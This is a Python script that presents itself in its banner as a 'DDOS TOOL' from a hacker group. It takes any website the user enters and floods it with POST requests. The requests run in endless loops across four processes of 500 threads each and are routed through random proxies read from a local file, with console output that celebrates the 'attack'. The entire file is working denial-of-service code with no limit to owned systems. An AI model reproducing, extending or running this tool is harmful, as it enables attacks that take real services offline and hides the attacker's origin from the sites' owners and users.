import threading
import multiprocessing
import requests
import os
import random
import time
import signal
from colorama import init, Fore, Style
from tqdm import tqdm  # Progress bar library

init(autoreset=True)


# Improved banner with slight animation for a hacky vibe
def logo():
    banner = r'''
        __________________________________________________
        |     xx      xx        \\     ________     //   |   
        |      xx    xx          \\  /          \  //    |
        |       xx  xx            \\/   (@) (@)  \//     |
        |       xx xx  <==MAN==>   \|      ^     |/      |
        |       xx  xx               \_./||||\._/        |       
        |      xx    xx             //\ \||||/ /\\       | 
        |     xx      xx           //  \______/  \\      |
        |    xx        xx         //              \\     |
        |___________________X5-BfG_______________________| 

           Reach us IG : xmanhacky ---  ☯️__X5 BfG__☯️

                            DDOS  TOOL
                we do bad things for good reasons 
           --------------------------------------------
    '''
    for line in banner.splitlines():
        print(Fore.RED + line)
        time.sleep(0.5)  # Adds delay to give it a more "hacker terminal" feel
    print('\n')


def load_proxies_from_file(file_path='working_proxies.txt'):
    try:
        with open(file_path, 'r') as file:
            proxies = file.read().splitlines()
            print(f"[✔️] Loaded {len(proxies)} proxies from {file_path}\n")
            return proxies
    except FileNotFoundError:
        print(f"[❌] Proxy file {file_path} not found.\n")
        return []


# Adding progress bar and using cleaner output formatting
def send_request(link, proxy):
    url = f"https://{link}"
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Referer': f'https://{link}'
    }
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    try:
        response = requests.post(url, headers=headers, proxies=proxies, timeout=5)
        if response:
            if response.status_code == 200:
                print(f"⟬☠️⟭> {Fore.LIGHTCYAN_EX}{Style.BRIGHT}Request to [{link}] via proxy [{proxy}] Got in! 👹 \n")
            else:
                print(
                    f"⟬☠️⟭> {Fore.RED}Request to [{link}] via proxy [{proxy}] failed with status code: {response.status_code}\n")
        else:
            print(f"⟬☠️⟭> {Fore.YELLOW}Request to [{link}] via proxy [{proxy}] succeeded but no response returned!\n")
    except requests.RequestException:
        print(f"⟬☠️⟭> {Fore.GREEN}[{link}😭]-->Proxy [{proxy}] Wait i Got it! 🔥\n")


def load_test(link, proxies, num_threads):
    progress = tqdm(total=num_threads, desc="🔥 Attacking", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}\n")
    while True:
        for _ in range(num_threads):
            proxy = random.choice(proxies)
            thread = threading.Thread(target=send_request, args=(link, proxy))
            thread.start()
            progress.update(1)
        progress.close()


def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


def terminate_all_processes(processes):
    print(f"{Fore.RED}\n⟬☠️⟭> Terminating all processes...")
    for process in processes:
        process.terminate()  # Terminate all running processes
        process.join()  # Ensure they are fully stopped
    print(f"{Fore.RED}⟬☠️⟭> All processes terminated.")


def main():
    clear_screen()
    logo()

    link = input("⟬☠️⟭>>Enter the Website link [e.g example.com]:  ")
    if not link.endswith((".com", ".in", ".net")):
        clear_screen()
        logo()

    if input("⟬☠️⟭>>You sure you wanna do this? (y/n): ").strip().lower() != 'y':
        return

    proxies = load_proxies_from_file('working_proxies.txt')
    if not proxies:
        return

    processes = []

    try:
        num_processes = 4
        num_threads_per_process = 500
        print(
            f"{Fore.CYAN}😁 Starting Stress Load <{num_processes}> attacks and <{num_threads_per_process}> army count each attack ...\n")

        # Start multiple processes for the load test
        for _ in range(num_processes):
            process = multiprocessing.Process(target=load_test, args=(link, proxies, num_threads_per_process))
            process.start()
            processes.append(process)

        # Wait for all processes to complete
        for process in processes:
            process.join()

    except KeyboardInterrupt:
        print(f"{Fore.RED}\n⟬☠️⟭> Attack terminated by user (Ctrl+C). Exiting...\n")
        terminate_all_processes(processes)  # Terminate all child processes when interrupted

    finally:
        if processes:
            terminate_all_processes(processes)  # Ensure clean termination on exit


if __name__ == "__main__":
    main()
